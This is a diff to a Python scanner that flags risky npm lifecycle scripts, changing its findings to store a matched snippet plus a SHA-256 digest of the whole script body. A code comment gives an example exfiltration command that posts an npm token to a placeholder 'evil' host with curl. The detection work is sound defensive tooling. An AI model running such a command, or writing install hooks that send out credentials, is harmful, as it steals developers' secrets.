@@ -1384,6 +1384,17 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
         body = scripts.get(hook)
         if not isinstance(body, str):
             continue
+        # Pin the whole lifecycle body via one digest shared by every lifecycle
+        # finding below: a script that keeps the matched signal but changes
+        # another line (e.g. swapping `echo safe` for `curl -d "$NPM_TOKEN"
+        # https://evil`) must reopen. The stored evidence is a bounded matched
+        # snippet plus this digest, never the entire body, so `--write-baseline`
+        # on a package with a multi-MiB install script does not bloat the baseline
+        # JSON while the digest still binds the full body. Whitespace-normalized to
+        # match _evidence_hash so a reindent alone does not reopen.
+        body_digest = hashlib.sha256(
+            " ".join(body.split()).encode("utf-8", "replace")
+        ).hexdigest()
         if _LIFECYCLE_FETCH_EXEC.search(body):
             findings.append(
                 Finding(
@@ -1391,7 +1402,7 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     package = pkg.display,
                     filename = rel,
                     pattern = f"lifecycle-fetch-exec ({hook})",
-                    evidence = body,
+                    evidence = f"{_evidence(body, _LIFECYCLE_FETCH_EXEC)} body-sha256:{body_digest}",
                     detail = (
                         f"`scripts.{hook}` fetches an external "
                         "resource and pipes/chains it to an "
@@ -1410,7 +1421,10 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                         package = pkg.display,
                         filename = rel,
                         pattern = f"cred-path-in-lifecycle ({hook})",
-                        evidence = body,
+                        evidence = (
+                            f"{_evidence(body, re.compile(re.escape(path_substr)))} "
+                            f"body-sha256:{body_digest}"
+                        ),
                         detail = (
                             f"`scripts.{hook}` references {why} "
                             f"({path_substr!r}); install-time access "
@@ -1420,14 +1434,6 @@ def scan_package_json(pkg: PackageEntry, rel: str, text: str) -> list[Finding]:
                     )
                 )
         if _JS_ENV_TOKEN.search(body):
-            # Pin the whole lifecycle body, not just the token line: a script that
-            # keeps the credential env reference but changes another line (e.g.
-            # swapping `echo safe` for `curl -d "$NPM_TOKEN" https://evil`) must
-            # reopen. Whitespace-normalized to match _evidence_hash so a reindent
-            # alone does not reopen.
-            body_digest = hashlib.sha256(
-                " ".join(body.split()).encode("utf-8", "replace")
-            ).hexdigest()
             findings.append(
                 Finding(
                     severity = HIGH,
